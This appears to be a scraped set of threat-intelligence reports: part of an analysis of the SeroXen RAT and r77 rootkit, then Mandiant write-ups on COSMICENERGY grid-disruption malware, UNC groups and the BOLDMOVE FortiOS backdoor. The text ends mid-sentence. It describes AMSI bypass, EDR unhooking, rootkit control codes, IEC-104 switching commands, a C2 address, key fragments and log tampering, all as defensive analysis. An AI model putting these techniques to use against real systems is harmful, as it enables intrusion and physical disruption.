Antivirus / EDR evasion: The rootkit uses several evasion techniques: AMSI bypass: PowerShell inline script patches “amsi.dll!AmsiScanBuffer” to always return “AMSI_RESULT_CLEAN”. DLL unhooking: Removes EDR hooks by loading a fresh copy of “ntdll.dll” from disk to avoid process hollowing detection

Hiding entities: Hiding all entities starts with a configurable prefix, which in SeroXen’s case its “$sxr”. This prefix hardens the visualization of the attack on the system, but eases attribution of the malware family during the analysis. The prefix is used to hide files, directories, NamedPipes, scheduled tasks, processes, registry keys/values, and services.

R77 technical documentation provides a guideline of where can the prefix be found:

Config parameter Details Example HIDE_PREFIX The prefix for name-based hiding (e.g. processes, files, etc...). L""$sxr"" R77_SERVICE_NAME32 Name for the scheduled task that starts the r77 service for 32-bit processes. HIDE_PREFIX L""svc32"" R77_SERVICE_NAME64 Name for the scheduled task that starts the r77 service for 64-bit processes. HIDE_PREFIX L""svc64"" CHILD_PROCESS_PIPE_NAME32 Name for the named pipe that notifies the 32-bit r77 service about new child processes. L""\\\\.\\pipe\\"" HIDE_PREFIX L""childproc32"" CHILD_PROCESS_PIPE_NAME64 Name for the named pipe that notifies the 64-bit r77 service about new child processes. L""\\\\.\\pipe\\"" HIDE_PREFIX L""childproc64"" CONTROL_PIPE_NAME Name for the named pipe that receives commands from external processes. L""\\\\.\\pipe\\"" HIDE_PREFIX L""control""

The two main components in this project are the InstallStager service and the Rootkit. The InstallStager service is responsible for:

Creating a registry key to store the malware code and writes it as encrypted data.

Creating a scheduled task to execute the malware using PowerShell. PowerShell will decompress and decrypt the final payload (Service) that will be injected into the winlogon.exe process and executed via dllhost.exe using process hollowing techniques.

Figure 6. Starting payload after decryption using process hollowing.

Now the second and main stage of the Rootkit is ready to start. The service kicks off the load of the rootkit’s DLL that is embedded as a resource and saves its configuration as a registry key. (In SeroXen case it's [HKEY_LOCAL_MACHINE\SOFTWARE\$sxrconfig]).

The service creates 3 listener threads:

NewProcessListener: Enumerates all running processes and injects the rootkit when new processes are created.

ChildProcessListener: Injects the rootkit to a newly created process by another process and updates the callee via NamedPipe.

Figure 7. Child process injection.

ControlPipeListener: Creates a NamedPipe to receive commands from any process. Supported commands are listed below:

Command Details CONTROL_R77_UNINSTALL The control code that uninstalls r77. CONTROL_R77_PAUSE_INJECTION The control code that temporarily pauses injection of new processes. CONTROL_R77_RESUME_INJECTION The control code that resumes injection of new processes. CONTROL_PROCESSES_INJECT The control code that injects r77 into a specific process, if it is not yet injected. CONTROL_PROCESSES_INJECT_ALL The control code that injects r77 into all processes that are not yet injected. CONTROL_PROCESSES_DETACH The control code detaches r77 from a specific process. CONTROL_PROCESSES_DETACH_ALL The control code detaches r77 from all processes. CONTROL_USER_SHELLEXEC The control code that executes a file using ShellExecute. CONTROL_USER_RUNPE The control code that executes an executable using process hollowing. CONTROL_SYSTEM_BSOD The control code that triggers a BSOD. CONTROL_R77_TERMINATE_SERVICE The control code that terminates the r77 service.

The DLL rootkit carries out process injections, executes commands received by other processes, and keeps out of sight any sign of SeroXen being executed within the system.

Figure 8. System function hooking.

As a summary of the execution process:

Figure 9. SeroXen decryption flow.

Since Seroxen is based on QuasarRAT, the C&C server utilizes the same Common Name in their TLS certificate. The functionalities offered by the threat actor for the C&C server closely mirror those found in the Quasar Github repository, including support for TCP network streams (both IPv4 and IPv6), efficient network serialization, compression using QuickLZ, and secure communication through TLS encryption.

Figure 10. Quasar Server Certificate.

Conclusion

The SeroXen developer has found a formidable combination of free resources to develop a hard to detect in static and dynamic analysis RAT. The use of an elaborated open-source RAT like Quasar, with almost a decade since its first appearance, makes an advantageous foundation for the RAT. While the combination of NirCMD and r77-rootkit are logical additions to the mix, since they make the tool more elusive and harder to detect.

The Alien Labs team will continue to monitor the threat landscape for SeroXen samples and infrastructure.

Mandiant Blog 1,https://www.mandiant.com/resources/blog/cosmicenergy-ot-malware-russian-response,"Mandiant identified novel operational technology (OT) / industrial control system (ICS)-oriented malware, which we track as COSMICENERGY, uploaded to a public malware scanning utility in December 2021 by a submitter in Russia. The malware is designed to cause electric power disruption by interacting with IEC 60870-5-104 (IEC-104) devices, such as remote terminal units (RTUs), that are commonly leveraged in electric transmission and distribution operations in Europe, the Middle East, and Asia.

COSMICENERGY is the latest example of specialized OT malware capable of causing cyber physical impacts, which are rarely discovered or disclosed. What makes COSMICENERGY unique is that based on our analysis, a contractor may have developed it as a red teaming tool for simulated power disruption exercises hosted by Rostelecom-Solar, a Russian cyber security company. Analysis into the malware and its functionality reveals that its capabilities are comparable to those employed in previous incidents and malware, such as INDUSTROYER and INDUSTROYER.V2 , which were both malware variants deployed in the past to impact electricity transmission and distribution via IEC-104.

The discovery of COSMICENERGY illustrates that the barriers to entry for developing offensive OT capabilities are lowering as actors leverage knowledge from prior attacks to develop new malware. Given that threat actors use red team tools and public exploitation frameworks for targeted threat activity in the wild, we believe COSMICENERGY poses a plausible threat to affected electric grid assets. OT asset owners leveraging IEC-104 compliant devices should take action to preempt potential in the wild deployment of COSMICENERGY.

COSMICENERGY Overview

COSMICENERGY’s capabilities and overall attack strategy appear reminiscent of the 2016 INDUSTROYER incident , which issued IEC-104 ON/OFF commands to interact with RTUs and, according to one analysis , may have made use of an MSSQL server as a conduit system to access OT. Leveraging this access, an attacker can send remote commands to affect the actuation of power line switches and circuit breakers to cause power disruption. COSMICENERGY accomplishes this via its two derivative components, which we track as PIEHOP and LIGHTWORK (see appendices for technical analyses).

PIEHOP is a disruption tool written in Python and packaged with PyInstaller that is capable of connecting to a user-supplied remote MSSQL server for uploading files and issuing remote commands to a RTU. PIEHOP utilizes LIGHTWORK to issue the IEC-104 commands ""ON"" or ""OFF"" to the remote system and then immediately deletes the executable after issuing the command. The sample of PIEHOP we obtained contains programming logic errors that prevent it from successfully performing its IEC-104 control capabilities, but we believe these errors can be easily corrected.

LIGHTWORK is a disruption tool written in C++ that implements the IEC-104 protocol to modify the state of RTUs over TCP. It crafts configurable IEC-104 Application Service Data Unit (ASDU) messages, to change the state of RTU Information Object Addresses (IOAs) to ON or OFF. LIGHTWORK utilizes positional command line arguments for target device, port, and IEC-104 command.

Figure 1: COSMICENERGY execution chain

COSMICENERGY lacks discovery capabilities, which implies that to successfully execute an attack the malware operator would need to perform some internal reconnaissance to obtain environment information, such as MSSQL server IP addresses, MSSQL credentials, and target IEC-104 device IP addresses. The sample of LIGHTWORK we obtained includes eight hardcoded IEC-104 information object addresses (IOA), which typically correlate with input or output data elements on a device and may correspond to power line switches or circuit breakers in an RTU or relay configuration. However, IOA mappings often differ between manufacturers, devices, and even environments. For this reason, the particular actions intended by the actor are unclear without further knowledge about the targeted assets.

COSMICENERGY Possibly Associated With Russian Government-Funded Power Disruption and Emergency Response Exercises

During our analysis of COSMICENERGY, we identified a comment in the code that indicated the sample uses a module associated with a project named “Solar Polygon” (Figure 2). We searched for the unique string and identified a single match to a cyber range (aka polygon) developed by Rostelecom-Solar, a Russian cyber security company that received a government subsidy in 2019 to begin training cyber security experts and conducting electric power disruption and emergency response exercises.

Figure 2: PIEHOP comment referring to “Solar Polygon”

Although we have not identified sufficient evidence to determine the origin or purpose of COSMICENERGY, we believe that the malware was possibly developed by either Rostelecom-Solar or an associated party to recreate real attack scenarios against energy grid assets. It is possible that the malware was used to support exercises such as the ones hosted by Rostelecom-Solar in 2021 in collaboration with the Russian Ministry of Energy or in 2022 for the St.Petersburg’s International Economic Forum (SPIEF).

However, given the lack of conclusive evidence, we consider it also possible that a different actor - either with or without permission - reused code associated with the cyber range to develop this malware. Threat actors regularly adapt and make use of red team tools - such as commercial and publicly available exploitation frameworks - to facilitate real world attacks, like TEMP.Veles’ use of METERPRETER during the TRITON attack . There are also many examples of nation-state actors leveraging contractors to develop offensive capabilities, as shown most recently in contracts between Russia’s Ministry of Defense and NTC Vulkan . These observations leave open the possibility that COSMICENERGY was developed with malicious intent, and at a minimum that it can be used to support targeted threat activity in the wild.

COSMICENERGY Shares Similarities with Existing OT Malware

Although COSMICENERGY does not directly overlap with any previously observed malware families, its capabilities are comparable to those employed in previous incidents and malware. The most significant similarities we identified are with INDUSTROYER and INDUSTROYER.V2, which were both malware variants deployed in the past to impact electricity transmission and distribution. COSMICENERGY also has notable technical similarities with other OT malware families that have been developed or packaged using Python or that have utilized open-source libraries for OT protocol implementation, including IRONGATE , TRITON , and INCONTROLLER . Further analyses of these similarities are available via Mandiant Advantage.

With regards to these similarities, we highlight the following trends which could manifest in future OT malware:

Abuse of insecure by design protocols : While OT-oriented malware families can be purpose built for a particular target environment, malware that takes advantage of insecure by design OT protocols, such as LIGHTWORK’s abuse of the IEC-104 protocol, can be modified and employed multiple times to target multiple victims.

Use of open source libraries for protocol implementation : The availability of open source projects that implement OT protocols can lower the barrier of entry for actors attempting to interact with OT devices. However, proprietary OT protocols will likely continue to require custom protocol implementations.

Use of Python for malware development and/or packaging: We expect to continue to observe attackers compiling or packaging their OT malware via methods such as PyInstaller (IRONGATE) or Py2Exe (TRITON) given the proliferation of OT malware developed or packaged using Python in recent years.

Outlook

While COSMICENERGY’s capabilities are not significantly different from previous OT malware families’, its discovery highlights several notable developments in the OT threat landscape. First, the discovery of new OT malware presents an immediate threat to affected organizations, since these discoveries are rare and because the malware principally takes advantage of insecure by design features of OT environments that are unlikely to be remedied any time soon. Second, as COSMICENERGY was potentially developed as part of a red team, this discovery suggests that the barriers to entry are lowering for offensive OT threat activity since we normally observe these types of capabilities limited to well resourced or state sponsored actors. Lastly, we emphasize that although the samples of COSMICENERGY we obtained are potentially red team related, threat actors regularly leverage contractors and red team tools in real world threat activity, including during OT attacks.

For these reasons, OT defenders and asset owners should take mitigating actions against COSMICENERGY to preempt in the wild deployment and to better understand common features and capabilities that are frequently deployed in OT malware. Such knowledge can be useful when performing threat hunting exercises and deploying detections to identify malicious activity within OT environments.

Discovery Methods

We provide at-risk organizations with the following discovery methods to conduct threat hunts for tactics, techniques, and procedures (TTPs) implemented derived from the toolset:

Establish collection and aggregation of host-based logs for crown jewels systems such as human-machine interfaces (HMI), engineering workstations (EWS), and OPC client servers within their environments and review logs for the evidence of Python script or unauthorized code execution on these systems.

Identify and investigate the creation, transfer, and/or execution of unauthorized Python-packaged executables (e.g., PyInstaller or Py2Exe) on OT systems or systems with access to OT resources.

Monitor systems with access to OT resources for the creation of legitimate temporary folders, files, artifacts, and external libraries required as evidence of the execution of packaged Python scripts. Creation of temporary “_MEIPASS” PyInstaller folder.

Monitor MSSQL Servers with access to OT systems and networks for evidence of: Reconnaissance and enumeration activity of MSSQL servers and credentials. Unauthorized network connections to MSSQL servers (TCP/1433) and irregular or unauthorized authentication. Enablement and usage of SQL extended stored procedures for Windows shell command execution: Figure 3: PIEHOP SQL command Certutil command usage: “certutil -hashfile” “certutil -decode” Transfer, creation, staging, and decoding of base64 encoded executables .

Appendix B: PIEHOP Technical Analysis

PIEHOP (filename: r3_iec104_control.exe) (MD5: cd8f394652db3d0376ba24a990403d20) is a disruption tool written in Python and packaged with PyInstaller version 2.1+ that has the capability to connect to a user supplied remote MSSQL server for uploading files and issuing remote commands to a RTU.

PIEHOP expects its main function to be called via another Python file, supplying either the argument control=True or upload=True . At a minimum, it requires the following arguments: oik , user , and pwd , and if called with control=True , it must also be supplied with iec104 :

Figure 4: PIEHOP command-line example

In the sample analyzed, PIEHOP’s entry point c018c54eff8fd0b9be50b5d419d80f21 (r3_iec104_control.py) calls PIEHOP’s main function, supplying the argument control=True . The file c018c54eff8fd0b9be50b5d419d80f21 (r3_iec104_control.py) imports the ""iec104_mssql_lib"" module, which is contained within the extracted contents as adfa40d44a58e1bc909abca444f7f616 (iec104_mssql_lib.pyc):

Figure 5: PIEHOP decompiled entry point

2b86adb6afdfa9216ef8ec2ff4fd2558 (iec104_mssql_lib.py) implements PIEHOP’s primary capabilities and contains many developer-supplied comments for the included code. Notably, the main function contains logic flaws that cause it to only be able to connect to an MSSQL server and upload OT_T855_IEC104_GR.exe (LIGHTWORK) to it, before immediately attempting to clean itself up.

If the main function is called with upload=True only, it will only perform its cleanup routine and immediately terminate.

If the main function is called with control=True only, it will take the path that is intended for upload=True, connect to the MSSQL server and, upload OT_T855_IEC104_GR.exe .

If both upload=True and control=True are supplied to the main function, it will immediately fail due to attempting to utilize command line arguments that were not parsed yet.

If implemented correctly, PIEHOP can connect to a user supplied remote MSSQL server for uploading LIGHTWORK and issuing remote commands specifically targeting RTU, and then delete itself. PIEHOP utilizes LIGHTWORK to execute the IEC-104 commands ""ON” or ""OFF"" on the remote system and immediately deletes the executable after issuing the commands.

Appendix C: LIGHTWORK Technical Analysis

LIGHTWORK (filename: OT_T855_IEC104_GR.exe) (MD5: 7b6678a1c0000344f4faf975c0cfc43d) is a disruption tool written in C++ that implements the IEC-104 protocol to modify the state of RTUs over TCP. It crafts configurable IEC-104 ASDU messages, to change the state of RTU IOAs to ON or OFF. This sample works in tandem with PIEHOP, which sets up the execution. LIGHTWORK takes the following positional command line arguments:

<ip_address> <port> <command> [either ON (1) or OFF (0)]

Figure 7: LIGHTWORK command line example

Upon execution, LIGHTWORK begins by sending a “C_IC_NA_1 – station interrogation command” to the specified target station retrieving the status of the target station. Next, it sends a “C_SC_NA_1 – single command” to each hardcoded IOA to modify the state of the target station’s IOA (OFF or ON). Last, it sends a single “C_CS_NA_1 – clock synchronization command” to the target station, which synchronizes the remote station time clock with the time clock for the device issuing the commands.

If executed successfully, LIGHTWORK provides the operator the following command-line output:

Appendix E: MITRE ATT&CK

T1140 : Deobfuscate/Decode Files or Information

Adversaries may use Obfuscated Files or Information to hide artifacts of an intrusion from analysis. They may require separate mechanisms to decode or deobfuscate that information depending on how they intend to use it. Methods for doing that include built-in functionality of malware or by using utilities present on the system.

T0807 : Command-Line Interface

Adversaries may utilize command-line interfaces (CLIs) to interact with systems and execute commands. CLIs provide a means of interacting with computer systems and are a common feature across many types of platforms and devices within control systems environments. Adversaries may also use CLIs to install and run new software, including malicious tools that may be installed over the course of an operation.

T0809 : Data Destruction

Adversaries may perform data destruction over the course of an operation. The adversary may drop or create malware, tools, or other non-native files on a target system to accomplish this, potentially leaving behind traces of malicious activities. Such non-native files and other data may be removed over the course of an intrusion to maintain a small footprint or as a standard part of the post-intrusion cleanup process.

T0831 : Manipulation of Control

Adversaries may manipulate physical process control within the industrial environment. Methods of manipulating control can include changes to set point values, tags, or other parameters. Adversaries may manipulate control systems devices or possibly leverage their own, to communicate with and command physical control processes. The duration of manipulation may be temporary or longer sustained, depending on operator detection.

T0855 : Unauthorized Command Message

Adversaries may send unauthorized command messages to instruct control system assets to perform actions outside of their intended functionality, or without the logical preconditions to trigger their expected function. Command messages are used in ICS networks to give direct instructions to control systems devices. If an adversary can send an unauthorized command message to a control system, then it can instruct the control systems device to perform an action outside the normal bounds of the device's actions. An adversary could potentially instruct a control systems device to perform an action that will cause an Impact"
Mandiant Blog 2,https://www.mandiant.com/resources/insights/uncategorized-unc-threat-groups,"UNC2452

UNC2452 is a sophisticated group that has targeted government and private sector entities worldwide. They have employed many unique capabilities, including gaining initial access through a software supply chain vulnerability.

After gaining access to a victim network, UNC2452 has a light malware footprint, often using legitimate credentials to access data and move laterally. The U.S. government attributed the SolarWinds supply chain compromise which we track as UNC2452 to the Russian Foreign Intelligence Service (SVR). Mandiant Threat Intelligence assesses that UNC2452 activity aligns with nation-state priorities broadly and that the group’s targeting patterns are consistent with Russian strategic interests.

UNC2529 is a well-resourced and experienced group that has targeted multiple organizations across numerous industries in a global phishing campaign. They have used phishing emails containing inline links to malicious URLs hosting DOUBLEDRAG malware, a highly obfuscated Javascript downloader. UNC2529 has also used weaponized Microsoft Excel documents as a first stage downloader. DOUBLEDRAG attempts to download a second-stage obfuscated PowerShell memory-only dropper, which Mandiant tracks as DOUBLEDROP, that will launch a backdoor into memory. This third-stage backdoor is tracked as DOUBLEBACK. UNC2529 displayed indications of target research based on their selection of sender email addresses and subject lines which were tailored to their intended victims. Although Mandiant has no data on the objectives of this threat actor, their broad targeting across industries and geographies is consistent with a targeting calculus most commonly seen among financially motivated groups.

Mandiant Blog 3,https://www.mandiant.com/resources/blog/chinese-actors-exploit-fortios-flaw,"Mandiant is tracking a suspected China-nexus campaign believed to have exploited a recently announced vulnerability in Fortinet's FortiOS SSL-VPN, CVE-2022-42475, as a zero-day. Evidence suggests the exploitation was occurring as early as October 2022 and identified targets include a European government entity and a managed service provider located in Africa.

Mandiant identified a new malware we are tracking as “BOLDMOVE” as part of our investigation. We have uncovered a Windows variant of BOLDMOVE and a Linux variant, which is specifically designed to run on FortiGate Firewalls. We believe that this is the latest in a series of Chinese cyber espionage operations that have targeted internet-facing devices and we anticipate this tactic will continue to be the intrusion vector of choice for well-resourced Chinese groups.

On December 12, 2022, Fortinet released a PSIRT Advisory and notified customers regarding CVE-2022-42475

Fortinet issued instructions on how to search for Indicators of Compromise Fortinet provided additional details including IoCs from subsequent research. China Continues to Focus on Network Devices This incident continues China’s pattern of exploiting internet facing devices, specifically those used for managed security purposes (e.g., firewalls, IPS\IDS appliances etc.). These devices are attractive targets for multiple reasons. First, they are accessible to the internet, and if the attacker has an exploit, they can gain access to a network without requiring any victim interaction. This allows the attacker to control the timing of the operation and can decrease the chances of detection. The exploits required to compromise these devices can be resource intensive to develop, and thus they are most often used in operations against hardened and high priority targets; often in the government and defense sectors. With BOLDMOVE, the attackers not only developed an exploit, but malware that shows an in-depth understanding of systems, services, logging, and undocumented proprietary formats. Malware running on an internet-connected device can enable lateral movement further into a network and enable command and control (C2) by tunneling commands in and data out of a network. It is important to note that many of these types of devices do not offer a simple mechanism to view which processes are running on the device’s operating systems. These devices are typically intended to inspect network traffic, searching for anomalies as well as signs of malicious behavior, but are often not inherently protected themselves. Managed devices may provide only a limited admin interface that allows configuration and viewing/collection of logs Managed devices may not allow for additional security products, such as Endpoint Detection and Response (EDR) to be installed Access to core security features may be limited to the device manufacturer Previous examples of public reporting by Mandiant and others on operations targeting these devices are here: Check Your Pulse: Suspected APT Actors Leverage Authentication Bypass Techniques and Pulse Secure Zero-Day NSA | APT5: Citrix ADC Threat Hunting Guidance Suspected Chinese Activity Exploiting Zero-Day Vulnerability, Leverages New Malware Designed for Internet-Facing Devices Zero-Days Exploit in SonicWall Email Security Lead to Enterprise Compromise BOLDMOVE Backdoor In December 2022, Mandiant identified the BOLDMOVE backdoor associated with the exploitation of CVE-2022-49475 FortiOS vulnerability. BOLDMOVE is written in C and has both Windows and Linux variants, the latter of which is intended to run (at least in part) on Fortinet devices as it reads data from a file proprietary to Fortinet. Mandiant has not directly observed exploitation of the vulnerability; however, samples of the BOLDMOVE Linux variant have a hard coded C2 IP address that were listed by Fortinet as being involved in the exploitation, suggesting CVE-2022-49475 was exploited to deliver BOLDMOVE. In addition to the Linux variant, Mandiant also revealed a Windows version. Windows versions of BOLDMOVE appear to have been compiled as early as 2021. However, Mandiant has not seen this malware in use in the wild so it is uncertain how it was used. In-depth analysis of the malware is provided later in this post. Attribution We assess with low confidence that this operation has a nexus to the People’s Republic of China. China-nexus clusters have historically shown significant interest in targeting networking devices and manipulating the operating system or underlying software which supports these devices. In addition, the geographical and sector targeting is consistent with previous Chinese operations. Limited technical indicators point to the development of the malware as having been compiled on a machine in the UTC+8 time zone, which includes Australia, China, Russia, Singapore, and other Eastern Asian countries, and on a machine configured to display Chinese characters. A host survey buffer which is used by the Windows variant of BOLDMOVE in order to provide the C2 with information on the infected host starts with the string “gbk”. The comparable survey buffer of the Linux variant starts with “utf-8”, which indicates that this field designates character encoding. If we are to consider “gbk” in this context, then this is an extension of a Chinese character set The exploitation of zero-day vulnerabilities in networking devices, followed by the installation of custom implants, is consistent with previous Chinese exploitation of networking devices. Mandiant has previously reported on significant campaigns impacting networking devices, likely revealing a long-standing interest by China to embed cyber campaigns in the overarching telecommunications and networking architecture used by organizations worldwide: In April 2021, Mandiant reported extensively on the exploitation of Pulse Secure. Mandiant recently responded to multiple security incidents involving compromises of Pulse Secure VPN appliances. In March 2021, Mandiant identified three zero-day vulnerabilities in SonicWall’s Email Security (ES) product that were being exploited in the wild. Mandiant’s investigations informed us that the adversary leveraged these vulnerabilities, with intimate knowledge of the SonicWall application, to install a backdoor, access files and emails, and move laterally into the victim organization’s network. Outlook Mandiant has produced in depth reporting on the growing number of managed, internet-facing and connected devices targeted by Chinese threat actors. This latest campaign may be a continuation of a long-standing practice by China-nexus cyber espionage actors. This campaign and infection vector also should be strong reminders of the importance of keeping up with updates and patches, of externally facing devices or those exposed to the internet. This campaign, and other similar campaigns, offer defenders a unique look into the vulnerabilities and gaps many organizations constantly face when services and networks are managed remotely. Given their configuration, it is very hard to measure the scope and extent of malicious activity that results from exploiting internet facing network devices, as we have little to no information that can indicate those devices are compromised. There is no mechanism to detect malicious processes running on such devices, nor telemetry to proactively hunt for malicious images deployed on them following an exploitation of a vulnerability. This makes network devices a blind spot for security practitioners and allows attackers to hide in them and maintain stealth for long periods, while also using them to gain foothold in a targeted network. BOLDMOVE Linux Analysis BOLDMOVE is a fully featured backdoor written in C and compiled with GCC 11.2.1. When executed it performs a system survey and is capable of receiving commands from a C2 server that in turn allow attackers to control the file system, spawn a remote shell, or relay traffic via the infected host. Based on indicators from the original Fortinet advisory, Mandiant was able to identify multiple Linux versions of BOLDMOVE. There are a core set of features across all observed instances of BOLDMOVE, Windows and Linux, and at least one Linux sample contained extended capabilities enabling it to alter specific behaviors and functionality of Fortinet devices, namely FortiGate Firewalls. Core Features Upon execution, BOLDMOVE attempts to form a session with a hard-coded C2 server. Once it is established, it performs a system survey to collect information that identifies the infected machine to the C2. Information collected is outlined in Table 1. Table 1: System Survey Index Field Value 0 Encoding used for the strings in the survey buffer: utf-8 1 Hard-coded string that seemingly identifies the sample or campaign, e.g., “Cora/c” 2 OS version string. For Linux-based operating systems this string has the format “Linux <linux_version> <utsname.release> <utsname.machine> [<utsname.version>]”, wherein the various fields are obtained from a call to the uname function. For non-Linux operating systems this string has the format <utsname.sysname> <utsname.release> <utsname.machine> [<utsname.version>]. The substring <linux_version> is being constructed by reading data from one of the files /etc/system-release, /etc/os-release (looking for the values of the NAME= and VERSION= keys),/migadmin/ng/vpn/map/pkginfo.json (looking for the value enclosed by the strings ver_s\"":\"" and \"",\""chksum), /etc/debian_version. 3 Host name 4 Comma-separated list of <ip>/<mask> entries that represent network interfaces on the host 5 The effective user ID of the backdoor's process (result of geteuid()) 6 The process ID of the backdoor's process 7 String of the format cwd=<current_dir>\r

executable=<current_image_path>\r

event=wv\r

server=139.180.128.142:443\r

/proc/version=<proc_version_data> Subsequently, the C2 may send commands for execution that allow attackers to control the infected device. Command codes across platforms and versions of BOLDMOVE may vary but their core capabilities do not appear to change and include: Table 2: Supported commands Major Command Code Minor Command Code Command 0x0 0x0 Frees all resources and terminates the backdoor 0x11 0x21 Lists information on all files in the system recursively, starting from the root directory. In addition to the file's path, the information provided for each file is based on output of the stat function and includes the following fields of the stat structure (details on it can be found here): st_mode, st_size, st_mtim.tv_sec, st_uid, st_gid. 0x11 0x0 Lists information on files recursively, starting from a given directory 0x12 0x0 Creates new directory via mkdir 0x13 0x0 Removes a directory via rmdir 0x14 0x10 Given an attacker provided file path, removes an existing file (if such exists) and creates a new file instead 0x14 0x21 Closes a file descriptor that was opened for writing 0x14 0x32 Writes data to the created file 0x15 0x10 Gets a file's size before reading from it 0x15 0x21 Closes a file descriptor that was opened for reading 0x15 0x40 Reads data from a formerly opened file 0x20 0x0 Executes a shell command and sends back the output 0x20 0x33 Executes a shell command without sending back an output 0x21 0x10, 0x21, 0x43, 0x44, 0x45 Creates an interactive shell that leverages two pipes—one for processing shell input from the server and another for sending back shell outputs, thus supporting an asynchronous session between the C2 and the infected host. The various subcommands handle actions involved in forming and maintaining the shell session 0x22 0x10, 0x21, 0x32,0x33 Creates an interactive shell that leverages a single pipe for both passing server sourced inputs to the shell and retrieving command outputs from it. The formed shell works in a synchronous mode, wherein the pipe can be either probed to retrieve shell output or written with input data in each access to it. The various subcommands handle actions involved in forming and maintaining the shell session 0x30 0x15, 0x16, 0x17, 0x18 Initiates a network traffic relay session. The C2 sends a target address as an argument and further packets passed through sub-commands of this command are used to pass data back and forth to and from the target server 0x53 0x10 Deletes the backdoor's image and creates a new one with the same name as preparation for writing an updated backdoor image 0x53 0x21 Closes the file descriptor opened for writing a backdoor image update 0x53 0x32 Writes data sent from the C2 server to the formerly opened file descriptor that corresponds to the updated backdoor image 0x54 0x0 Spawns a new process of the backdoor with the argument 1, which would in turn attempt to execute an image with that name. The purpose of this action is unclear. 0x55 0x0 Same as command 0x54 0x56 0x0 Serves as an echo command; receives a command packet from the server and replies back with a packet that has the same major command code and blank body. Possibly used to check the infected host's connectivity\state. The Linux iteration of BOLDMOVE leverages several statically compiled libraries to implement its functionality: An undetermined and likely custom library used for event handling (reminiscent of libevent). It operates in a single-threaded mode, wherein each action is scheduled and executed as an event callback. It may allude to the fact that the developers aimed for supporting the infection of single core devices, among others. WolfSSL (also compiled in a single-threaded mode), which facilitates SSL encrypted communication to the C2 server. Musl libc Upon failure, the malware reruns itself in a new process. In addition, if the malware is executed with a command line argument, it would not initiate the backdoor logic but rather attempt to execute the provided argument as a new process. Prior to starting the backdoor's logic, the malware calls the signal function in order to ignore the signals SIGCHLD, SIGHUP, SIGPIPE. Extended Features The extended version of BOLDMOVE (MD5: 3191cb2e06e9a30792309813793f78b6) contains all the aforementioned functionality but with additional features. The extended version contains Execution Guardrails (T1480) by verifying that it is executing from a specific path. It accomplishes this in the following manner: Retrieving its own path from /proc/self/exe Obtaining an inode from this resultant path via fstatat Obtain a secondary inode from the statically defined path /bin/wxd Comparing these two inode records Figure 1: Path Execution Guardrails The extended version contains a command that can perform Indicator Blocking (T1562.006) by disabling Fortinet daemons miglogd and syslogd. It also contains a command enabling it to patch memory address spaces of the same logging daemons. Due to Mandiant being unable to obtain those executables from Fortinet devices, we are unable to accurately determine the nature of those patches. However, Mandiant assesses it is likely that they are intended to disable a logging capability during the backdoor’s run-time. Each patch data is kept in the following struct: struct st_log_patch_struct { char fortigate_version_name[24]; __int64 target_addr1; __int64 patch_bytes1; __int64 target_addr2; __int64 patch_bytes2; }log_patch_struct; Table 4 in Appendix A summarizes the targeted FortiGate Devices, their corresponding patched addresses, and bytes. Additionally, the extended version of BOLDMOVE contains a command capable of modifying proprietary Fortinet logs on the system. It checks the following paths: /tmp/log /var/log/log /var/log For filenames matching the format: elog offset/elog.ofs offset/elog.<index>.cidx One of BOLDMOVE’s extended variant commands is capable of decompressing, parsing, and overwriting the undocumented structure pertaining to those proprietary log files allowing the attacker to modify chosen parts of the logs. The extended version contains a Watchdog like feature that may enable the malware to persist across upgrades. To accomplish this, BOLDMOVE monitors two files via the fstatat function: /data/lib/libgif.so /data/lib/libips.so If the size of these files differs, BOLDMOVE performs the following actions: Creates a backup of the legitimate file /data/lib/libips.so stored at /data/lib/libiptcp.so Overwrites the legitimate library /data/lib/libips.so with a trojanized version of it located at /data/lib/libgif.so Thus, if there were to be a system patch that replaced /data/lib/libips.so and the malware was still executing, it would be able to undo the patch and maintain execution. In addition, the extended version contains a command that allows the attackers to send requests to an internal Fortinet service, possibly to modify device settings or expose internal parts of the associated network to the internet. BOLDMOVE reads the contents of /dev/cmdb/vdom and parses its information to retrieve a numeric value, which may be associated with a virtual domain on the device. Then it creates a connection to “127.0.0.1”, localhost, over an attacker provided port. This suggests that a server is expected to run on that port locally. The command handler facilitates sending attacker-chosen data over the established connection and sending back any retrieved response back to the C2. Table 3 outlines some of the differences between the Windows and Linux variants of BOLDMOVE that were identified by Mandiant: Table 3: Differences between the Windows and Linux variants of BOLDMOVE Windows Linux Compiler C and compiled with MinGW (GCC: (GNU) 10.2.1 20210227) Compile Time: 2021-08-26 07:13:04 C and compiled with GCC 11.2.1 20211120 Compile Time: Unknown SSL/TLS No Yes UserAgent curl/6.12.34

(this is a non-public version of libcurl, last v6 build was 6.5; also, the malware itself does not make actual use of libcurl) curl/6.12.34 C2 Private class C IP Address Globally routable IP Address Supports light weight systems No Uses an event driven model wherein event callbacks are used instead of threads. This is facilitated by a library like the one leveraged by the Linux variant of BOLDMOVE, however the reason for using it in Windows is unclear. Yes Uses an event driven model, wherein event callbacks are used instead of threads Musl is compiled statically into the malware’s binary image.Musl has been associated for its lighter utilization of resources in compraison to other libc variants. WolfSSL that is used by the malware for encrypting traffic to the C2 is also designed in part with embedded devices in mind. Encryption Established connection packets are encrypted with Salsa20: Key: <8_byte_pseudorandom_nonce> || “ e 8d m_$Gb ” Established sessions are encrypted with AES128: Key: <8_byte_pseudorandom_nonce> || “rg8P@TD(“ IV: <8_byte_pseudorandom_nonce> || “ e 5s m_$Gb ” Campaign 0.1c#2021-08-26 15:13:01 Charlotte/c

(other campaign names were observed in different samples of the Linux variant) The survey and commands are functionally equivalent amongst both Linux and Windows. Windows and Linux Variant Comparison Table 3 shows the distinction between the Windows and Linux variants of BOLDMOVE. Most importantly, the Windows variant appears to have been compiled a year before the Linux variants. This discrepancy in time could indicate that the attackers have been developing BOLDMOVE and possibly using it in the wild since that time. The differences may offer insight into the functionality and intended use of the malware. There are a few differences in choices of libraries that were statically compiled into each of the variants. While the WolfSSL library was used in Linux in order to encrypt traffic, the Windows variant does not make use of it. In addition, the Linux version leverages a statically compiled Musl libc library as opposed to standard libc functions imported as a result of compiling the Windows variant with MinGW. The usage of the Musl libc in the Linux variant along with a library that facilitates an event driven communication with the C2 server, could indicate that the Linux version is generally intended to be used on embedded devices, and devices with low processing power. Mandiant assesses that the BOLDMOVE Linux variant was deployed on Fortinet devices after a successful exploitation of CVE-2022-42475. However, the method for initial infection from the Windows variant is currently unclear. With that in mind, a private class C IP address ( 192.168.120[.]206) that was used in the Windows variant could indicate that it was used to communicate with an infected device inside the network following lateral movement or was merely 